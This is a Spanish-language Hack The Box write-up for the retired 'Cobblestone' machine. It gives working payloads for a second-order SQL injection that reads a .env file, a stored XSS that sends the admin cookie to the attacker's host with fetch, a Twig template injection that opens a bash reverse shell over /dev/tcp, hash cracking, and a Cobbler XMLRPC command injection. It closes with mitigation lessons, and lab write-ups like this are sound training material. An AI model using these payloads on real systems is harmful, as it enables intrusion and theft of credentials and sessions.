---
machine: Cobblestone
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, sqli, second-order, twig, ssti, cobbler, cve-2024-47533]
---

# Cobblestone — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

De web a root en Debian 12 con cinco eslabones. Dos vhosts (`vote` y `deploy`): una **SQLi de segundo orden** en la votación permite `LOAD_FILE` y leer el `.env` del panel; un **XSS almacenado** roba la sesión del admin; el panel de despliegue renderiza **Twig** con entrada del usuario (SSTI) y da shell; un hash bcrypt de la BD abre SSH; y `cobblerd` en `127.0.0.1:25151` con **CVE-2024-47533** cierra como root.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.cobblestone.htb" -w subdomains.txt -mc 200,403
```

```text
vote.cobblestone.htb     (app de votaciones)
deploy.cobblestone.htb   (panel de despliegues)
```

## 1. SQLi de segundo orden

El registro de `vote` acepta un comentario que se guarda y se inserta más tarde en la consulta de moderación:

```sql
SELECT * FROM comments WHERE author = '<comentario guardado>'
```

Se registra con:

```text
x', (SELECT LOAD_FILE('/var/www/deploy/.env'))) -- -
```

La siguiente vez que el admin abre la moderación, el contenido del `.env` aparece en el HTML: credenciales de BD y `APP_SECRET`.

## 2. XSS almacenado para la cookie

Otro campo filtra el saneado con SVG:

```html
<svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
```

```bash
python3 -m http.server 8000
```

La cookie de admin llega al servidor propio y se reutiliza en el panel.

## 3. Twig SSTI

El panel de `deploy` renderiza una plantilla Twig a partir de la descripción del despliegue:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
```

```bash
nc -lvnp 4444
```

```text
www-deploy@cobblestone:~$
```

## 4. Hash y SSH

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh <user>@cobblestone.htb
```

## 5. Cobbler XMLRPC (CVE-2024-47533)

`cobblerd` escucha solo en localhost, y el fallo permite ejecución no autenticada por el API XMLRPC:

```bash
curl -s http://127.0.0.1:25151/cobbler_api -d \
'<?xml version="1.0"?><methodCall><methodName>generate_profile_name</methodName>
<params><param><value><string>a;id>/tmp/pwned</string></value></param></params></methodCall>'
```

El proceso corre como root y ejecuta el comando inyectado:

```bash
cat /tmp/pwned
```

## Evidencia (redactada)

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- **SQLi de segundo orden**: el payload se guarda limpio y explota al releerlo; los WAF que solo miran la petición de entrada no lo ven.
- `LOAD_FILE` sigue disponible si el usuario de BD tiene `FILE`: leer el `.env` de otra app es leer sus secretos.
- **SSTI** en un motor de plantillas es RCE: nunca renderizar texto del usuario como plantilla.
- Mitigación: consultas preparadas en todas las lecturas, `FILE` revocado, plantillas compiladas sin `registerUndefinedFilterCallback`, Cobbler parcheado y `cobblerd` con autenticación.
